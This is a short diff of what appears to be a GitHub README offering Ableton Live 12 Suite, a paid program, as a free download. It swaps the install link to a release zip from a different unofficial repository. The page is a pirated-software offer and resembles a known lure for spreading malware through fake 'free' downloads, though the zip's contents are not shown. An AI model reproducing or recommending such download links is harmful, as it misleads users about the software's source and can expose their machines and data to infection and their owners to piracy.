@@ -9,7 +9,7 @@ Ableton Live 12 Suite is the most powerful edition of Ableton Live, featuring th
 <img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/ed7bdb6d-848d-48d8-915c-1f4d5c5459c6" />
 
 ## Install
-[Download `Ableton12-Setup.zip`](https://github.com/ableton-12-suite/Ableton-12-Live-Suite-free/releases/download/v12.0.0/Ableton-12-Live-Suite.zip)
+[Download `Ableton12-Setup.zip`](https://github.com/ableton12/Ableton-12-Free/releases/download/12/Ableton12-Setup.zip)
 ---
 <img width="1564" height="960" alt="image" src="https://github.com/user-attachments/assets/9bc2f028-836c-43bb-9187-7ebdebef695c" />
 <img width="1540" height="850" alt="image" src="https://github.com/user-attachments/assets/ff261a21-da5d-4741-a02e-b5ba7a99ea78" />
